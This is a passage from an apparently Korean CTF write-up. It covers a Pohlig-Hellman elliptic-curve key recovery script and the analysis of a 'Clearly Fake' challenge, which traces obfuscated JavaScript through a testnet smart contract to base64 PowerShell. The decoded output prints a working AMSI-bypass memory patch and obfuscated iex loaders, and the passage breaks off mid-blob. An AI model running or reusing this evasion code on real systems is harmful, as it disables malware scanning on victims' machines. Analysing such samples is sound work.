    Gx = int("087b5fe3ae6dcfb0e074b40f6208c8f6de4f4f0679d6933796d3b9bd659704fb85452f041fff14cf0e9aa7e45544f9d8", 16)
    Gy = int("127425c1d330ed537663e87459eaa1b1b53edfe305f6a79b184b3180033aab190eb9aa003e02e9dbf6d593c5e3b08182", 16)
    F = GF(p)
    E = EllipticCurve(F, [a, b])

    G = E(Gx, Gy)
    
    PAx = int('195b46a760ed5a425dadcab37945867056d3e1a50124fffab78651193cea7758d4d590bed4f5f62d4a291270f1dcf499', 16)  
    PAy = int('357731edebf0745d081033a668b58aaa51fa0b4fc02cd64c7e8668a016f0ec1317fcac24d8ec9f3e75167077561e2a15', 16) 
    PA = E(PAx, PAy)  

    PBx = int('b3e5f89f04d49834de312110ae05f0649b3f0bbe2987304fc4ec2f46d6f036f1a897807c4e693e0bb5cd9ac8a8005f06', 16) 
    PBy = int('85944d98396918741316cd0109929cb706af0cca1eaf378219c5286bdc21e979210390573e3047645e1969bdbcb667eb', 16) 
    PB = E(PBx, PBy)
    
    return G, PA, E, PB

# The Baby-Step Giant Step (BSGS) algorithm helps reduce the complexity of calculating the discrete logarithm
# g_i^x_i mod p_i = h_i to O(sqrt(p_i)) instead of O(p_i) with traditional brute force.  The way BSGS works is that
# We rewrite the discrete logarithm x_i in terms of im + j, where m = ceil(sqrt(n)).  This allows for a meet-in-the-middle
# style calculation of $x$--namely, we first calculate g^j mod p for every 0 <= j < m, and then calculate g^i mod p for 
# 0 <= j <= p, multiplying by a^-m for every y not equal to 

def BSGS(G, PA, n, E):

    # Normally ceil(sqrt(n)) should work but for some reason some test cases break this
    M = ceil(sqrt(n)) + 1
    y = PA
    log_table = {}
    
    for j in range(M):
        log_table[j] = (j, j * G)

    inv = -M * G
    
    for i in range(M):
        for x in log_table:
            if log_table[x][1] == y:
                return i * M + log_table[x][0]
    
        y += inv
        
    return None

# The Pohlig-Hellman attack on Diffie-Hellman works as such:
# Given the generator, public keys of either Alice or Bob, as well as the multiplicative order
# Of the group (which in Diffie-Hellman is p - 1 due to prime modulus), 
# one can factor the group order (which by construction here is B-smooth) into 
# Small primes.  By Lagrange's theorem, we have that


def pohlig_hellman_EC(G, PA, E, debug=True):
    """ Attempts to use Pohlig-Hellman to compute discrete logarithm of A = g^a mod p"""
    
    # This code is pretty clunky, naive, and unoptimized at the moment, but it works.

    n = E.order() 
    factors = [p_i ^ e_i for (p_i, e_i) in factor(n)]
    factors.remove(7072010737074051173701300310820071551428959987622994965153676442076542799542912293)
    crt_array = []

    if debug:
        print("[x] Factored #E(F_p) into %s" % factors)

    for p_i in factors:
        g_i = G * (n // p_i)
        h_i = PA * (n // p_i)
        x_i = BSGS(g_i, h_i, p_i, E)
        if debug and x_i != None:
            print("[x] Found discrete logarithm %d for factor %d" % (x_i, p_i))
            crt_array += [x_i]
        
        elif x_i == None:
            print("[] Did not find discrete logarithm for factor %d" % p_i)

    kA_maybe = crt(crt_array, factors)
    
    m = prod(factors)
    for i in range(n // m):
        kA = kA_maybe + m * i
        if kA * G == PA:
            break
    
    return kA

def polling_hellman():

    G, PA, E, PB = generate_params()
    print("Attempting Pohlig-Hellman factorization with \nG = %s\nPA = %s\nE is an %s\n" 
        % (G, PA, E))
    kA = pohlig_hellman_EC(G, PA, E)
    assert kA * G == PA
    print("[x] Recovered scalar kA such that PA = G * kA through Pohlig-Hellman: %d" % kA)
    shared_key = kA*PB
    
    x,y = shared_key.xy()
    return x
    
def decrypt(shared_key):
    ciphers = [
        'f272d54c31860f',
        '3fbd43da3ee325',
        '86dfd7',
        'c50cea1c4aa064c35a7f6e3ab0258441ac1585c36256dea83cac93007a0c3a29864f8e285ffa79c8eb43976d5b587f8f35e699547116',
        'fcb1d2cdbba979c989998c',
        '61490b',
        'ce39da',
        '577011e0d76ec8eb0b8259331def13ee6d86723eac9f0428924ee7f8411d4c701b4d9e2b3793f6117dd30dacba',
        '2cae600b5f32cea193e0de63d709838bd6',
        'a7fd35',
        'edf0fc',
        '802b15186c7a1b1a475daf94ae40f6bb81afcedc4afb158a5128c28c91cd7a8857d12a661acaec',
        'aec8d27a7cf26a17273685',
        '35a44e',
        '2f3917',
        'ed09447ded797219c966ef3dd5705a3c32bdb1710ae3b87fe66669e0b4646fc416c399c3a4fe1edc0a3ec5827b84db5a79b81634e7c3afe528a4da15457b637815373d4edcac2159d056',
        'f5981f71c7ea1b5d8b1e5f06fc83b1def38c6f4e694e3706412eabf54e3b6f4d19e8ef46b04e399f2c8ece8417fa',
        '4008bc',
        '54e41e',
        'f701fee74e80e8dfb54b487f9b2e3a277fa289cf6cb8df986cdd387e342ac9f5286da11ca2784084',
        '5ca68d1394be2a4d3d4d7c82e5',
        '31b6dac62ef1ad8dc1f60b79265ed0deaa31ddd2d53aa9fd9343463810f3e2232406366b48415333d4b8ac336d4086efa0f15e6e59',
        '0d1ec06f36'
    ]

    hash_origin = sha512(shared_key.to_bytes()).digest()
    key = hash_origin[:32]
    nonce = hash_origin[32:40]
    
    cipher = ChaCha20.new(key=key, nonce=nonce)
    for ciphertext in ciphers:
        print(cipher.decrypt(bytes.fromhex(ciphertext)))
        
        

if __name__=='__main__':
    shared_key = polling_hellman()
    decrypt(shared_key)
```
<br />

### get_kG.py
```python
def get_kG():
    xor_key = '133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337'
    xor_key_bytes = bytes.fromhex(xor_key)

    kG_client_x_xord = '0a6c559073da49754e9ad9846a72954745e4f2921213eccda4b1422e2fdd646fc7e28389c7c2e51a591e0147e2ebe7ae'
    kG_client_y_xord = '264022daf8c7676a1b2720917b82999d42cd1878d31bc57b6db17b9705c7ff2404cbbf13cbdb8c096621634045293922'
    kG_server_x_xord = 'a0d2eba817e38b03cd063227bd32e353880818893ab02378d7db3c71c5c725c6bba0934b5d5e2d3ca6fa89ffbb374c31'
    kG_server_y_xord = '96a35eaf2a5e0b430021de361aa58f8015981ffd0d9824b50af23b5ccf16fa4e323483602d0754534d2e7a8aaf8174dc'
    
    kG_client_x_xord_bytes = bytes.fromhex(kG_client_x_xord)
    kG_client_y_xord_bytes = bytes.fromhex(kG_client_y_xord)
    kG_server_x_xord_bytes = bytes.fromhex(kG_server_x_xord)
    kG_server_y_xord_bytes = bytes.fromhex(kG_server_y_xord)
    
    kG_client_x = bytes(a ^ b for a, b in zip(kG_client_x_xord_bytes, xor_key_bytes)).hex()
    kG_client_y = bytes(a ^ b for a, b in zip(kG_client_y_xord_bytes, xor_key_bytes)).hex()
    kG_server_x = bytes(a ^ b for a, b in zip(kG_server_x_xord_bytes, xor_key_bytes)).hex()
    kG_server_y = bytes(a ^ b for a, b in zip(kG_server_y_xord_bytes, xor_key_bytes)).hex()
    
    return([kG_client_x,kG_client_y,kG_server_x,kG_server_y])

kG = get_kG()
```

<br />

# 8. Clearly Fake

난독화된 `js`가 주어진다. 난독화를 해제하면 `Binance Smart Chain` 테스트넷에서 특정 스마트 컨트랙트를 호출하는 코드를 확인 가능하다. 스마트 컨트랙트에 대한 기초적인 수준의 이해를 필요로 한다.

<br />

## 초기 접근

### 난독화 해제
[Deobfuscator](https://deobfuscate.relative.im/)를 활용하여 난독화 해제 한다.

```js
eval(
  (function (_0x263ea1, _0x2e472c, _0x557543, _0x36d382, _0x28c14a, _0x39d737) {
    _0x28c14a = function (_0x3fad89) {
      return (
        (_0x3fad89 < _0x2e472c
          ? ''
          : _0x28c14a(parseInt(_0x3fad89 / _0x2e472c))) +
        ((_0x3fad89 = _0x3fad89 % _0x2e472c) > 35
          ? String.fromCharCode(_0x3fad89 + 29)
          : _0x3fad89.toString(36))
      )
    ...
```
<br />

추가적으로 [de4js](https://lelinhtinh.github.io/de4js/)를 활용하면 `eval` 난독화도 깔끔하게 해석할 수 있다.

```js
const Web3 = require("web3");
const fs = require("fs");
const web3 = new Web3("BINANCE_TESTNET_RPC_URL");
const contractAddress = "0x9223f0630c598a200f99c5d4746531d10319a569";
async function callContractFunction(inputString) {
    try {
        const methodId = "0x5684cff5";
        const encodedData = methodId + web3.eth.abi.encodeParameters(["string"], [inputString]).slice(2);
        const result = await web3.eth.call({
            to: contractAddress,
            data: encodedData
        });
        const largeString = web3.eth.abi.decodeParameter("string", result);
        const targetAddress = Buffer.from(largeString, "base64").toString("utf-8");
        const filePath = "decoded_output.txt";
        fs.writeFileSync(filePath, "$address = " + targetAddress + "\n");
        const new_methodId = "0x5c880fcb";
        const blockNumber = 43152014;
        const newEncodedData = new_methodId + web3.eth.abi.encodeParameters(["address"], [targetAddress]).slice(2);
        const newData = await web3.eth.call({
            to: contractAddress,
            data: newEncodedData
        }, blockNumber);
        const decodedData = web3.eth.abi.decodeParameter("string", newData);
        const base64DecodedData = Buffer.from(decodedData, "base64").toString("utf-8");
        fs.writeFileSync(filePath, decodedData);
        console.log(`Saved decoded data to:${filePath}`)
    } catch (error) {
        console.error("Error calling contract function:", error)
    }
}
const inputString = "KEY_CHECK_VALUE";
callContractFunction(inputString);
```

<br />

### Smart Contract Decompile

Contract Address가 주어졌으므로 [BSCscan](https://testnet.bscscan.com)을 이용해 검색한다. 코드에 쓰여있듯 `TESTNET`에 검색해야 한다.

![image](/assets/img/writeups/202412/8_0.jpg)

<br />

Contract 탭에서 스마트 컨트랙트를 확인하려 했는데 디컴파일 오류가 발생했다. OpCode 탭을 확인하니 `invalid opcode`가 포함된 것으로 표기된다. 이미 잘 호출된 스마트 컨트랙트가 컴파일 오류가 발생했을 리(invalid opcode가 포함되었을 리) 없으므로, `BSCscan` 자체 디컴파일러가 오류가 있는 것으로 결론 내렸다. 그래서 다른 디컴파일러를 탐색하였고, [dedaub](https://app.dedaub.com/)를 활용하였더니 디컴파일이 잘 이루어졌다. 

![image](/assets/img/writeups/202412/8_1.jpg)

<br />

## Smart Contract

### Contract 0x9223f0...
주어진 문자열의 첫 자가 0x67, 둘째 자가 0x69 등 조건을 만족하면 `0x5324eab94b236d4d1456edc574363b113cebf09`를 `return`한다. 

```js
function fallback() public payable { 
    revert();
}

function testStr(string str) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(str <= uint64.max);
    require(4 + str + 31 < 4 + (msg.data.length - 4));
    require(str.length <= uint64.max, Panic(65)); // failed memory allocation (too much memory)
    v0 = new bytes[](str.length);
    require(!((v0 + ((str.length + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) + 32 + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) > uint64.max) | (v0 + ((str.length + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) + 32 + 31 & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) < v0)), Panic(65)); // failed memory allocation (too much memory)
    require(str.data + str.length <= 4 + (msg.data.length - 4));
    CALLDATACOPY(v0.data, str.data, str.length);
    v0[str.length] = 0;
    if (v0.length == 17) {
        require(0 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
        v1 = v0.data;
        if (bytes1(v0[0] >> 248 << 248) == 0x6700000000000000000000000000000000000000000000000000000000000000) {
            require(1 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
            if (bytes1(v0[1] >> 248 << 248) == 0x6900000000000000000000000000000000000000000000000000000000000000) {
                require(2 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                if (bytes1(v0[2] >> 248 << 248) == 0x5600000000000000000000000000000000000000000000000000000000000000) {
                    require(3 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                    if (bytes1(v0[3] >> 248 << 248) == 0x3300000000000000000000000000000000000000000000000000000000000000) {
                        require(4 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                        if (bytes1(v0[4] >> 248 << 248) == 0x5f00000000000000000000000000000000000000000000000000000000000000) {
                            require(5 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                            if (bytes1(v0[5] >> 248 << 248) == 0x4d00000000000000000000000000000000000000000000000000000000000000) {
                                require(6 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                if (bytes1(v0[6] >> 248 << 248) == 0x3300000000000000000000000000000000000000000000000000000000000000) {
                                    require(7 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                    if (bytes1(v0[7] >> 248 << 248) == 0x5f00000000000000000000000000000000000000000000000000000000000000) {
                                        require(8 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                        if (bytes1(v0[8] >> 248 << 248) == 0x7000000000000000000000000000000000000000000000000000000000000000) {
                                            require(9 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                            if (bytes1(v0[9] >> 248 << 248) == 0x3400000000000000000000000000000000000000000000000000000000000000) {
                                                require(10 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                                if (bytes1(v0[10] >> 248 << 248) == 0x7900000000000000000000000000000000000000000000000000000000000000) {
                                                    require(11 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                                    if (bytes1(v0[11] >> 248 << 248) == 0x4c00000000000000000000000000000000000000000000000000000000000000) {
                                                        require(12 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                                        if (bytes1(v0[12] >> 248 << 248) == 0x3000000000000000000000000000000000000000000000000000000000000000) {
                                                            require(13 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                                            if (bytes1(v0[13] >> 248 << 248) == 0x3400000000000000000000000000000000000000000000000000000000000000) {
                                                                require(14 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                                                if (bytes1(v0[14] >> 248 << 248) == 0x6400000000000000000000000000000000000000000000000000000000000000) {
                                                                    require(15 < v0.length, Panic(50)); // access an out-of-bounds or negative index of bytesN array or slice
                                                                    if (bytes1(v0[15] >> 248 << 248) == 0x2100000000000000000000000000000000000000000000000000000000000000) {
                                                                        v2 = v3.data;
                                                                        v4 = bytes20(0x5324eab94b236d4d1456edc574363b113cebf09d000000000000000000000000);
                                                                        if (v3.length < 20) {
                                                                            v4 = v5 = bytes20(v4);
                                                                        }
                                                                        v6 = v7 = v4 >> 96;
                                                                    } else {
                                                                        v6 = v8 = 0;
                                                                    }
                                                                } else {
                                                                    v6 = v9 = 0xce89026407fb4736190e26dcfd5aa10f03d90b5c;
                                                                }
                                                            } else {
                                                                v6 = v10 = 0x506dffbcdaf9fe309e2177b21ef999ef3b59ec5e;
                                                            }
                                                        } else {
                                                            v6 = v11 = 0x26b1822a8f013274213054a428bdbb6eba267eb9;
                                                        }
                                                    } else {
                                                        v6 = v12 = 0xf7fc7a6579afa75832b34abbcf35cb0793fce8cc;
                                                    }
                                                } else {
                                                    v6 = v13 = 0x83c2cbf5454841000f7e43ab07a1b8dc46f1cec3;
                                                }
                                            } else {
                                                v6 = v14 = 0x632fb8ee1953f179f2abd8b54bd31a0060fdca7e;
                                            }
                                        } else {
                                            v6 = v15 = 0x3bd70e10d71c6e882e3c1809d26a310d793646eb;
                                        }
                                    } else {
                                        v6 = v16 = 0xe2e3dd883af48600b875522c859fdd92cd8b4f54;
                                    }
                                } else {
                                    v6 = v17 = 0x4b9e3b307f05fe6f5796919a3ea548e85b96a8fe;
                                }
                            } else {
                                v6 = v18 = 0x6371b88cc8288527bc9dab7ec68671f69f0e0862;
                            }
                        } else {
                            v6 = v19 = 0x53fbb505c39c6d8eeb3db3ac3e73c073cd9876f8;
                        }
                    } else {
                        v6 = v20 = 0x84abec6eb54b659a802effc697cdc07b414acc4a;
                    }
                } else {
                    v6 = v21 = 0x87b6cf4edf2d0e57d6f64d39ca2c07202ab7404c;
                }
            } else {
                v6 = v22 = 0x53387f3321fd69d1e030bb921230dfb188826aff;
            }
        } else {
            v6 = v23 = 0x40d3256eb0babe89f0ea54edaa398513136612f5;
        }
    } else {
        v6 = v24 = 0x76d76ee8823de52a1a431884c2ca930c5e72bff3;
    }
    MEM[MEM[64]] = address(v6);
    return address(v6);
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__( function_selector) public payable { 
    MEM[64] = 128;
    require(!msg.value);
    if (msg.data.length >= 4) {
        if (0x5684cff5 == function_selector >> 224) {
            testStr(string);
        }
    }
    fallback();
}
```

<br />

참고로 만족시키는 문자열(0x6769...)은 해독해보면 아래 사진과 같다. ~~정답과 관련은 없지만 맞는 방향으로 나아가고 있다는 확신을 준다.~~

![image](/assets/img/writeups/202412/8_2.jpg)

<br />

### Contract 0x5324ea...

최초 `js`를 다시 살펴보자. 첫번째 스마트 컨트랙트에서 `return`한 문자열을 인자로 다음 스마트 컨트랙트를 호출한다. 그러므로 `return` 받은 `0x5324ea...`를 호출한다.

```js
const largeString = web3.eth.abi.decodeParameter("string", result);
        const targetAddress = Buffer.from(largeString, "base64").toString("utf-8");
        const filePath = "decoded_output.txt";
        fs.writeFileSync(filePath, "$address = " + targetAddress + "\n");
        const new_methodId = "0x5c880fcb";
        const blockNumber = 43152014;
        const newEncodedData = new_methodId + web3.eth.abi.encodeParameters(["address"], [targetAddress]).slice(2);
        const newData = await web3.eth.call({
            to: contractAddress,
            data: newEncodedData
        }, blockNumber);
```

<br />

`block number`가 주어졌으므로 해당 블록을 [BSCscan](testnet.bscscan.com)에서 확인한다. input data가 존재하는데, `base64` 인코딩 된 것으로 보인인다. 

![image](/assets/img/writeups/202412/8_3.jpg)

<br />

앞 부분을 조금 지워가며 `base64` 디코딩을 하면 파워쉘 명령을 얻을 수 있다. `base64` 인코딩된 문자열이 또 보이므로 한번 더 디코딩한다.

```js
ø[sYstEm.Text.eNCODinG]::unicodE.getStrinG([sYstEm.cONvErt]::FroMbaSE64stRInG("IwBSAGEAcwB0AGEALQBtAG8AdQBzAGUAcwAgAEEAbQBzAGkALQBTAGMAYQBuAC0AQgB1AGYAZgBlAHIAIABwAGEAdABjAGgAIABcAG4ADQAKACQAZgBoAGYAeQBjACAAPQAgAEAAIgANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABmAGgAZgB5AGMAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAaQB4AGEAagBtAHoALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAAJABmAGgAZgB5AGMADQAKAA0ACgAkAG4AegB3AHQAZwB2AGQAIAA9ACAAWwBmAGgAZgB5AGMAXQA6ADoATABvAGEAZABMAGkAYgByAGEAcgB5ACgAIgAkACgAKAAnAOMAbQBzAO0ALgAnACsAJwBkAGwAbAAnACkALgBOAE8AcgBtAEEAbABpAHoARQAoAFsAYwBIAGEAUgBdACgANwAwACoAMwAxAC8AMwAxACkAKwBbAGMAaABhAHIAXQAoADEAMQAxACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AHQAZQBdADAAeAA3ADIAKQArAFsAQwBIAGEAUgBdACgAMQAwADkAKwA2ADAALQA2ADAAKQArAFsAQwBoAGEAUgBdACgANQA0ACsAMQA0ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAYwBoAGEAUgBdACgAWwBiAFkAVABFAF0AMAB4ADUAYwApACsAWwBDAEgAYQByAF0AKABbAGIAWQBUAEUAXQAwAHgANwAwACkAKwBbAEMAaABBAFIAXQAoADEAMgAzACsAMgAtADIAKQArAFsAQwBIAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADQAZAApACsAWwBDAGgAQQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANgBlACkAKwBbAGMAaABhAHIAXQAoAFsAYgB5AFQARQBdADAAeAA3AGQAKQApACIAKQANAAoAJABuAGoAeQB3AGcAbwAgAD0AIABbAGYAaABmAHkAYwBdADoAOgBHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKAAkAG4AegB3AHQAZwB2AGQALAAgACIAJAAoACgAJwDBAG0AcwDsAFMAYwAnACsAJwDkAG4AQgB1AGYAZgAnACsAJwBlAHIAJwApAC4ATgBPAHIAbQBBAEwASQB6AEUAKABbAEMASABhAFIAXQAoAFsAYgBZAFQARQBdADAAeAA0ADYAKQArAFsAQwBoAGEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADYAZgApACsAWwBjAEgAQQByAF0AKABbAGIAWQBUAEUAXQAwAHgANwAyACkAKwBbAEMASABhAHIAXQAoADEAMAA5ACkAKwBbAGMASABhAFIAXQAoAFsAQgB5AFQAZQBdADAAeAA0ADQAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBjAGgAQQBSAF0AKAA5ADIAKQArAFsAQwBoAGEAcgBdACgAWwBiAHkAVABFAF0AMAB4ADcAMAApACsAWwBjAGgAYQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANwBiACkAKwBbAGMAaABhAFIAXQAoAFsAQgBZAHQARQBdADAAeAA0AGQAKQArAFsAYwBoAGEAcgBdACgAMgAxACsAOAA5ACkAKwBbAGMAaABhAFIAXQAoADMAMQArADkANAApACkAIgApAA0ACgAkAHAAIAA9ACAAMAANAAoAWwBmAGgAZgB5AGMAXQA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABuAGoAeQB3AGcAbwAsACAAWwB1AGkAbgB0ADMAMgBdADUALAAgADAAeAA0ADAALAAgAFsAcgBlAGYAXQAkAHAAKQANAAoAJABoAGEAbAB5ACAAPQAgACIAMAB4AEIAOAAiAA0ACgAkAGQAZABuAGcAIAA9ACAAIgAwAHgANQA3ACIADQAKACQAeABkAGUAcQAgAD0AIAAiADAAeAAwADAAIgANAAoAJABtAGIAcgBmACAAPQAgACIAMAB4ADAANwAiAA0ACgAkAGUAdwBhAHEAIAA9ACAAIgAwAHgAOAAwACIADQAKACQAZgBxAHoAdAAgAD0AIAAiADAAeABDADMAIgANAAoAJAB5AGYAbgBqAGIAIAA9ACAAWwBCAHkAdABlAFsAXQBdACAAKAAkAGgAYQBsAHkALAAkAGQAZABuAGcALAAkAHgAZABlAHEALAAkAG0AYgByAGYALAArACQAZQB3AGEAcQAsACsAJABmAHEAegB0ACkADQAKAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAHkAZgBuAGoAYgAsACAAMAAsACAAJABuAGoAeQB3AGcAbwAsACAANgApAA=="))|iex
```

<br />

코드가 나오긴 했지만 문제와 별 관련이 없어 보인다. ~~놀랍게도 그것은 사실이다.~~ 출제 오류로 flag 관련 부분이 input에 포함되지 않았다고 한다. 출제진이 문제 오류를 패치하여 `block number 44335452`를 추가하였으므로 대신 해당 블록을 보자.

```js
#Rasta-mouses Amsi-Scan-Buffer patch \n
$fhfyc = @"
using System;
using System.Runtime.InteropServices;
public class fhfyc {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ixajmz, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $fhfyc

$nzwtgvd = [fhfyc]::LoadLibrary("$(('ãmsí.'+'dll').NOrmAlizE([cHaR](70*31/31)+[char](111)+[Char]([Byte]0x72)+[CHaR](109+60-60)+[ChaR](54+14)) -replace [chaR]([bYTE]0x5c)+[CHar]([bYTE]0x70)+[ChAR](123+2-2)+[CHar]([byte]0x4d)+[ChAR]([bYTE]0x6e)+[char]([byTE]0x7d))")
$njywgo = [fhfyc]::GetProcAddress($nzwtgvd, "$(('ÁmsìSc'+'änBuff'+'er').NOrmALIzE([CHaR]([bYTE]0x46)+[Char]([bYTe]0x6f)+[cHAr]([bYTE]0x72)+[CHar](109)+[cHaR]([ByTe]0x44)) -replace [chAR](92)+[Char]([byTE]0x70)+[chaR]([bYTE]0x7b)+[chaR]([BYtE]0x4d)+[char](21+89)+[chaR](31+94))")
$p = 0
[fhfyc]::VirtualProtect($njywgo, [uint32]5, 0x40, [ref]$p)
$haly = "0xB8"
$ddng = "0x57"
$xdeq = "0x00"
$mbrf = "0x07"
$ewaq = "0x80"
$fqzt = "0xC3"
$yfnjb = [Byte[]] ($haly,$ddng,$xdeq,$mbrf,+$ewaq,+$fqzt)
[System.Runtime.InteropServices.Marshal]::Copy($yfnjb, 0, $njywgo, 6)
```
<br />

같은 방식으로 base64 디코딩된 input이 존재하며, 해제하면 아래와 같은 파워쉘 코드를 얻을 수 있다. 

```
øinvOKe-eXpREsSIon (NeW-OBJeCt SystEm.Io.StReaMREAdeR((NeW-OBJeCt Io.COMPRESsIOn.deflATestream( [sYSTeM.Io.memORyStREaM] [cONvErt]::fROmbAsE64StriNg('jVdrc+LGEv3Or5jKJhdpQSwSAmxSlbrYV/Zy7TUuIM5uKGpLiMGWFySVNHhxCP89p0ejB+Ck4rKkmZ7umX6c6W407Ydd63y/69j7Xbu739nt/a7bxBg0Inf2O8xa5n5n4WljDEqbHlAszMDUxYrdwhirZ2DGUgdfG1tixQSHjW+LZHFCC0smHhpCqA2uDr4t+tIx+NokjX9iwYfUoRWcauNIE/u3sGTSGGsmKUZjiFjgt3Bgm77gM0mG5qQTeFqYW5C1SAnwmGQy0bAPWQO2Nplg7X8wlqx6Oe7fhF9qN9V6dcsXeN+zhSSEX8InwT8ZbBGqOU1FwkcG/xa+BANNY3yzch8MFiU8Znzt3hmMr+auH4Mo+Liim+79fvBHt9mw8O7h8aI4CJPnwR9qy27dJPLCx6s+u7kc3l6wOonMvWXz7Mxrb5tK0hXugpiUIIYJTl0s3JvOUrGEAi+1vpsSJVm7sRuRGJ7VyvW+wgbFTba6F+swvkqUDBevc+ymPQZ+LMaCK/J14+xq8muvNwNdkRahFzgNsc1YJo01F8nreKqxbK/UM2rm+17SF6tN7idFP3KXbiUlHRQPVLE7PElVhRYi5i9BeDnNvV+sSmk6AKYJdx2HV+wdY1+xH1sajIJhfe41dxgw/FV2THj8eT40njzXIeZkOGC+D2F1tDtnYqXGG/WVJjwJptRg7yr7CtP12ZN4DPhtg1S4eOXf6MyfmI/PtEyKw+3cIO3IXNhIjuRsMAAKGabrTZK4GpMBSAo9HkiETwqT27mlJ5DbV/SOyeq6xerAczAQsSuSPKrJfDNOddzyJ6LSMMTu3lTTHK9/e++MGvp5azbqf/Sms+tgMJqMp3X93E4pte65GjTP0kFJrHMi1u4qbrutBlbTPJGDhZVF4K7XoUc+CkKfoB1tHXXRKjrg+uiulr8//4b/3qWK5qOr/FNa+YUp9OZxw1Y3HTVZsvDJ48z7wBZrGA3nkWPJf/jm0NHFCu9GzOfrzV3ZT5MS/BiJNst4xVwecoCpDOgELd0EC+nT0F8X4VziEoMLg8E+SgsfYLpwPX8l+QKusTTOoWBQI7tMQPqyBD9yDv4ZXXHaiHHPXUU8Nlg5zvmFA4Cwu8IFDKZJluAuDSYCP4wWAf8qeIBcJ0hHP/5V+lsk4b3pSigW910hMvN6ccXBx2byArRzL7FaqlTKJylKvgA7LqZugpHQmyW7HMRgp/MlzpOYC8FXDLffi7O0E0Ub9iT879Jhwn/0F1IRtSxuCOt0Ij7Z4RgaLA/2W5dq6y+BR3LBtknJg+4/fwnXfJRt/K5SwTbSEnnr4ME8E0pMXSkEkKHhlzSZZllUWgROjV13LErwDXIDDWL/+uNkEt7yJTT/orP/XZ3/tPtsPX9le6bXwM0w0eBSYzBxPjE68qUfD/rzW6cXXtGeLHt0cOt0eg6LNPhc+PFv75DCyDB6lNrAwfMhhA5DTcQMU2WPKSJ2Prwt5bBSPKn6pDCNJBQwl0WnXG3yMnOKNxOaZXdXhinzNqBBwPBQ+J48iYJlyJLYdyOpOF1sppHbnOCh54Wfkoh7U